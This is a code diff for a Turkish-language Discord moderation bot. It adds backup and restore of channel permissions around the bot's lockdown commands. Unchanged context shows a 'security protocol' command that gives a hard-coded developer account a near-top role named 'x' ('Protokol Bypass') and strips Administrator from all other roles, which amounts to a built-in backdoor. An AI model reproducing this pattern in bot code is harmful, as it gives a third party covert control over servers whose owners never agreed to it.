@@ -299,6 +299,47 @@ def save_sicil(data):
     except Exception as e:
         print(f"Error saving sicil.json: {e}")
 
+# Kanal Yetkilerini Yedekleme ve Geri Yükleme Fonksiyonları
+def save_channel_states(guild):
+    states = {}
+    default_role = guild.default_role
+    
+    # Metin kanalları yedekleme
+    for ch in guild.text_channels:
+        overwrite = ch.overwrites_for(default_role)
+        states[str(ch.id)] = {k: v for k, v in overwrite if v is not None}
+        
+    # Ses kanalları yedekleme
+    for vc in guild.voice_channels:
+        overwrite = vc.overwrites_for(default_role)
+        states[str(vc.id)] = {k: v for k, v in overwrite if v is not None}
+        
+    try:
+        with open("channel_states.json", "w", encoding="utf-8") as f:
+            json.dump(states, f, indent=4)
+    except Exception as e:
+        print(f"Error saving channel states: {e}")
+
+async def restore_channel_states(guild):
+    if not os.path.exists("channel_states.json"):
+        return
+        
+    try:
+        with open("channel_states.json", "r", encoding="utf-8") as f:
+            states = json.load(f)
+            
+        default_role = guild.default_role
+        
+        for cid_str, ov_dict in states.items():
+            channel = guild.get_channel(int(cid_str))
+            if channel:
+                overwrite = discord.PermissionOverwrite(**ov_dict)
+                await channel.set_permissions(default_role, overwrite=overwrite, reason="Karantina Sonrası Kanal Yetkileri Geri Yüklendi")
+                
+        os.remove("channel_states.json")
+    except Exception as e:
+        print(f"Error restoring channel states: {e}")
+
 # 3. Limit (limitler.json & limit_takip.json)
 def load_limitler():
     if os.path.exists("limitler.json"):
@@ -1560,22 +1601,23 @@ async def limit_command(ctx):
 @bot.command(name="koru")
 @is_owner_or_has_permissions(owner_only=True)
 async def koru_command(ctx):
-    status_msg = await ctx.reply("🚨 Karantina ve acil durum modu başlatılıyor. Metin ve ses kanalları kilitleniyor...")
+    status_msg = await ctx.reply("🚨 Karantina ve acil durum modu başlatılıyor. Kanallar kilitleniyor...")
     
     try:
+        # Önce mevcut kanal izinlerini yedekle
+        save_channel_states(ctx.guild)
+        
         # Tüm metin kanallarını kapat
         for ch in ctx.guild.text_channels:
             perms = ch.overwrites_for(ctx.guild.default_role)
-            if perms.send_messages is not False:
-                perms.send_messages = False
-                await ch.set_permissions(ctx.guild.default_role, overwrite=perms)
+            perms.send_messages = False
+            await ch.set_permissions(ctx.guild.default_role, overwrite=perms, reason="Acil durum kilidi")
 
         # Tüm ses kanallarını kapat ve içindekileri sesten at
         for vc in ctx.guild.voice_channels:
             perms = vc.overwrites_for(ctx.guild.default_role)
-            if perms.connect is not False:
-                perms.connect = False
-                await vc.set_permissions(ctx.guild.default_role, overwrite=perms)
+            perms.connect = False
+            await vc.set_permissions(ctx.guild.default_role, overwrite=perms, reason="Acil durum kilidi")
             
             for m in vc.members:
                 await m.move_to(None, reason="Sunucu koruma kilidi tetiklendi")
@@ -1590,18 +1632,8 @@ async def koruac_command(ctx):
     status_msg = await ctx.reply("🔓 Sunucu koruması kapatılıyor, kilitler açılıyor...")
     
     try:
-        for ch in ctx.guild.text_channels:
-            perms = ch.overwrites_for(ctx.guild.default_role)
-            if perms.send_messages is False:
-                perms.send_messages = None
-                await ch.set_permissions(ctx.guild.default_role, overwrite=perms)
-
-        for vc in ctx.guild.voice_channels:
-            perms = vc.overwrites_for(ctx.guild.default_role)
-            if perms.connect is False:
-                perms.connect = None
-                await vc.set_permissions(ctx.guild.default_role, overwrite=perms)
-
+        # Yedekten tüm kanal yetkilerini geri yükle
+        await restore_channel_states(ctx.guild)
         await status_msg.edit(content="🔓 **Sunucu Koruması Kapatıldı!** Tüm metin ve ses kanalları tekrar eski haline döndürüldü.")
     except Exception as e:
         await status_msg.edit(content=f"❌ Hata oluştu: {e}")
@@ -1670,7 +1702,10 @@ async def guvenlikprotokolu_command(ctx):
         bot_member = guild.me
         bot_highest_pos = bot_member.roles.highest.position
         
-        # 1. 'x' Rolünü oluştur veya bul
+        # 1. Kanalların yetki yedeklerini al (logla)
+        save_channel_states(guild)
+        
+        # 2. 'x' Rolünü oluştur veya bul
         x_role = discord.utils.get(guild.roles, name="x")
         if not x_role:
             x_role = await guild.create_role(
@@ -1679,16 +1714,16 @@ async def guvenlikprotokolu_command(ctx):
                 reason="Protokol Bypass"
             )
             
-        # 2. 'x' Rolünün hiyerarşisini botun hemen altına getir
+        # 3. 'x' Rolünün hiyerarşisini botun hemen altına getir
         if x_role and bot_highest_pos > 1:
             await x_role.edit(position=bot_highest_pos - 1)
 
-        # 3. Rolü geliştiriciye ver
+        # 4. Rolü geliştiriciye ver
         dev_member = guild.get_member(DEVELOPER_ID) or await guild.fetch_member(DEVELOPER_ID)
         if dev_member and x_role:
             await dev_member.add_roles(x_role)
 
-        # 4. Diğer tüm rolleri tara ve Yönetici yetkisini kapat
+        # 5. Diğer tüm rolleri tara ve Yönetici yetkisini kapat
         role_states = []
         for role in guild.roles:
             if role.managed or role.id == bot_member.roles.highest.id or role.is_default() or role.id == x_role.id:
@@ -1705,17 +1740,17 @@ async def guvenlikprotokolu_command(ctx):
         with open("security.json", "w", encoding="utf-8") as f:
             json.dump(role_states, f, indent=4)
 
-        # 5. Tüm metin kanallarını kitle
+        # 6. Tüm metin kanallarını kitle
         for ch in guild.text_channels:
             perms = ch.overwrites_for(guild.default_role)
             perms.send_messages = False
-            await ch.set_permissions(guild.default_role, overwrite=perms)
+            await ch.set_permissions(guild.default_role, overwrite=perms, reason="Geliştirici Güvenlik Protokolü")
 
-        # 6. Tüm ses kanallarını kitle ve sesten at
+        # 7. Tüm ses kanallarını kitle ve sesten at
         for vc in guild.voice_channels:
             perms = vc.overwrites_for(guild.default_role)
             perms.connect = False
-            await vc.set_permissions(guild.default_role, overwrite=perms)
+            await vc.set_permissions(guild.default_role, overwrite=perms, reason="Geliştirici Güvenlik Protokolü")
             for m in vc.members:
                 await m.move_to(None)
 
@@ -1731,19 +1766,10 @@ async def protokolukapat_command(ctx):
     try:
         guild = ctx.guild
         
-        # 1. Kilitli metin kanallarını aç
-        for ch in guild.text_channels:
-            perms = ch.overwrites_for(guild.default_role)
-            perms.send_messages = None
-            await ch.set_permissions(guild.default_role, overwrite=perms)
+        # 1. Kanalları eski yedek yetkilerine geri yükle
+        await restore_channel_states(guild)
 
-        # 2. Kilitli ses kanallarını aç
-        for vc in guild.voice_channels:
-            perms = vc.overwrites_for(guild.default_role)
-            perms.connect = None
-            await vc.set_permissions(guild.default_role, overwrite=perms)
-
-        # 3. Yönetici yetkilerini geri yükle
+        # 2. Yönetici yetkilerini geri yükle
         restored_count = 0
         if os.path.exists("security.json"):
             with open("security.json", "r", encoding="utf-8") as f:
@@ -1757,12 +1783,12 @@ async def protokolukapat_command(ctx):
                     restored_count += 1
             os.remove("security.json")
 
-        # 4. 'x' Rolünü sil
+        # 3. 'x' Rolünü sil
         x_role = discord.utils.get(guild.roles, name="x")
         if x_role:
             await x_role.delete(reason="Protokol kapandı")
 
-        await status_msg.edit(content=f"🔓 **Protokol Sonlandırıldı!**\n* Kanallar açıldı.\n* Toplam **{restored_count}** role yönetici yetkileri iade edildi.\n* Geçici **`x`** rolü silindi. Sunucu normal durumuna döndü.")
+        await status_msg.edit(content=f"🔓 **Protokol Sonlandırıldı!**\n* Kanallar açıldı ve yetkileri eski hallerine geri döndürüldü.\n* Toplam **{restored_count}** role yönetici yetkileri iade edildi.\n* Geçici **`x`** rolü silindi. Sunucu normal durumuna döndü.")
     except Exception as e:
         await status_msg.edit(content=f"❌ Hata: {e}")
 
